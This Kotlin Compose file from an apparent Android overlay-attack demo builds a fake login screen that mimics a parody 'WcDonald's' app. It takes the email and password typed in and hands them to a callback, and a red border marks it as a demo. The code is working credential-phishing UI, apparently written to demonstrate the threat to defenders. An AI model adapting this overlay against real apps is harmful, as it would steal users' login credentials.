package com.ghosttouch.attacker.overlay

import android.util.Log
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Email
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Fake login overlay — pixel-perfect replica of the WcDonald's LoginScreen.
 *
 * Uses the exact same Material3 components (Scaffold, TopAppBar, OutlinedTextField)
 * with identical colors, shapes, spacing and typography as the real defender app.
 *
 * A subtle red border is added around the edges as a demo indicator so the
 * presenter can visually distinguish the overlay from the real app during demos.
 */

// WcDonald's brand colors — must match defender/ui/theme/Theme.kt exactly
private val WcRed = Color(0xFFDA291C)
private val WcYellow = Color(0xFFFFC72C)
private val WcWhite = Color(0xFFFFFFFF)
private val WcBackground = Color(0xFFFAFAFA)
private val WcGrayDark = Color(0xFF757575)

/** Demo-only red border color to identify the overlay visually. */
private val DemoBorderRed = Color(0xFFFF0000)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FakeLoginOverlay(
    onCredentialsCaptured: (email: String, password: String) -> Unit,
    onDismiss: () -> Unit
) {
    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    var isLoading by remember { mutableStateOf(false) }
    val coroutineScope = rememberCoroutineScope()

    // Red border wrapping the entire overlay for demo visibility
    Box(
        modifier = Modifier
            .fillMaxSize()
            .border(3.dp, DemoBorderRed)
            .background(WcBackground)
    ) {
        Scaffold(
            containerColor = WcBackground,
            topBar = {
                // Exact same TopAppBar as defender LoginActivity
                TopAppBar(
                    title = { Text("Sign In") },
                    navigationIcon = {
                        IconButton(onClick = { /* fake back — does nothing */ }) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(
                        containerColor = WcRed,
                        titleContentColor = WcWhite,
                        navigationIconContentColor = WcWhite
                    )
                )
            }
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Spacer(modifier = Modifier.height(24.dp))

                // Logo — identical to defender
                Box(
                    modifier = Modifier
                        .size(80.dp)
                        .background(WcYellow, RoundedCornerShape(40.dp)),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        "W",
                        fontSize = 40.sp,
                        fontWeight = FontWeight.Bold,
                        color = WcRed
                    )
                }

                Text(
                    "Welcome Back",
                    style = MaterialTheme.typography.headlineSmall,
                    fontWeight = FontWeight.Bold
                )

                Text(
                    "Sign in to your WcDonald's account",
                    style = MaterialTheme.typography.bodyMedium,
                    color = WcGrayDark
                )

                Spacer(modifier = Modifier.height(16.dp))

                // Email field — same spec as defender
                OutlinedTextField(
                    value = email,
                    onValueChange = { email = it },
                    label = { Text("Email") },
                    placeholder = { Text("your@email.com") },
                    leadingIcon = {
                        Icon(Icons.Default.Email, contentDescription = null)
                    },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                // Password field — same spec as defender
                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = {
                        Icon(Icons.Default.Lock, contentDescription = null)
                    },
                    trailingIcon = {
                        IconButton(onClick = { passwordVisible = !passwordVisible }) {
                            Icon(
                                if (passwordVisible) Icons.Default.Visibility
                                else Icons.Default.VisibilityOff,
                                contentDescription = "Toggle password visibility"
                            )
                        }
                    },
                    visualTransformation = if (passwordVisible) VisualTransformation.None
                    else PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(8.dp))

                // Sign in button — same spec as defender
                Button(
                    onClick = {
                        isLoading = true
                        val capturedEmail = email
                        val capturedPassword = password
                        Log.d("FakeLoginOverlay", "Capturing: email=$capturedEmail")
                        onCredentialsCaptured(capturedEmail, capturedPassword)
                        coroutineScope.launch {
                            delay(500)
                            onDismiss()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = WcRed),
                    enabled = email.isNotBlank() && password.isNotBlank() && !isLoading
                ) {
                    if (isLoading) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(24.dp),
                            color = WcWhite
                        )
                    } else {
                        Text("Sign In", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }
                }

                TextButton(onClick = { /* fake — part of the deception */ }) {
                    Text("Forgot Password?", color = WcRed)
                }
            }
        }
    }
}
